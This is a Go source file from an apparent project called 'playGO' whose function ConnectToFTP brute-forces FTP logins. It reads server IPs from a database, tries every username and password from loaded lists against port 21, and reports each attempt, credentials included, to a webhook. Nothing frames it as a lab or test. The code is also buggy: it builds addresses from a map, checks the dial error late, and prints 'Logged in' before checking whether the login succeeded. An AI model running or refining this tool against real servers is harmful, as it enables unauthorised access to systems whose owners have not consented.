package pkg

import (
	"fmt"
	"playGO/cmd"
	"playGO/handler"
	"playGO/util"

	"github.com/jlaffaye/ftp"
)

func ConnectToFTP() {
	ips, err := util.GetFTPServerFromDB()
	if err != nil {
		println("Error getting IPs from DB:", err.Error())
		return
	}
	fmt.Println("Loaded IPs from database:", ips)
	if len(ips) == 0 {
		println("No IPs found in the database")
		return
	}
	for _, ip := range ips {
		address := fmt.Sprintf("%s:21", ip)
		connection, err := ftp.Dial(address)
		if ipStr, ok := ip["address"].(string); ok {
			util.AddChecked(ipStr)
		} else {
			println("Invalid IP format in database:", ip)
			continue
		}
		if err != nil {
			println("Error connecting to FTP server:", err.Error())
			return
		}
		usernames, err := handler.LoadUsernames()
		if err != nil {
			println("Error loading username file:", err.Error())
			return
		}
		fmt.Println("Loaded usernames:", usernames)
		passwords, err := handler.LoadPasswords()
		if err != nil {
			println("Error loading passwords:", err.Error())
			return
		}
		fmt.Println("Loaded passwords:", passwords)
		for _, username := range usernames {
			for _, password := range passwords {
				err := connection.Login(username, password)
				webhook := "webhookHere"
				cmd.SendWebhookMessage(webhook, fmt.Sprintf("Connecting to %s on port %d with username %s and password %s", ip, 21, username, password))
				fmt.Println("Logged in on: ", ip)
				if err != nil {
					println("Error logging in to FTP server:", err.Error())
					continue
				}
				println("Successfully logged in to FTP server:", ip)
			}
		}
	}
}
